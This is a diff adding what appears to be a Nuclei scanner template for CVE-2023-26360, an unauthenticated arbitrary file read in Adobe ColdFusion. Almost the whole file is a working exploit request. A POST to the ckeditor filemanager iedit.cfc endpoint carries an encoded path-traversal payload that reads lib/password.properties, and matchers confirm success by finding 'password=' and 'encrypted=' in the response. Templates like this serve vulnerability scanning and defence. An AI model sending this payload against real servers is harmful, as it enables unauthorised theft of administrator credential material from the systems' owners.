@@ -1,0 +1,28 @@
+id: adobe-coldfusion-unauth-file-read
+info:
+  name: Adobe ColdFusion Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2023-26360,file-read
+  description: |
+    Exploits an unauthenticated arbitrary file read vulnerability in Adobe ColdFusion.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&_cfclient=true&returnFormat=wddx&inPassword=foo"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      _variables=%7b%22_metadata%22%3a%7b%22classname%22%3a%22i/../lib/password.properties%22%7d%2c%22_variables%22%3a%5b%5d%7d
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "password="
+          - "encrypted="
+        part: body
+      - type: regex
+        regex:
+          - "(?i)(adobe|coldfusion)"
+        part: body
